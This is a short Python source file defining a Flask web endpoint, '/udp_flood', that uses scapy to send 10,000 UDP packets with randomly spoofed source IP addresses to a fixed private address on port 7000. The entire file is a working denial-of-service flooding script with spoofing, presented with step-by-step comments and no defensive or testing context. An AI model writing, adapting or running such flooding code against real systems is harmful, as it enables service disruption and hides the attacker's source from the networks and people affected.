import time
from flask import Flask
import sys
from scapy.all import *
app = Flask(__name__)

def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randPort():
    x = random.randint(0, 64000)
    return x

@app.route('/udp_flood')
def udp_flood():
    #Get Destination ip address input
    dest_ip_address = '192.168.23.1'
    #Get Destination port input
    dest_port = 7000
    #Get number of packets that need be sent
    pkt_count = 10000
    for i in range(0, pkt_count):
        #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create UDP object to given destination port
        udp = UDP(dport=dest_port)
        #Create packet from IP packet and UDP Object
        pkt = packet/udp/Raw(load="BRUHHHHHHHHHHHHH")
        #Send request
        send(pkt)
    return "Success"


    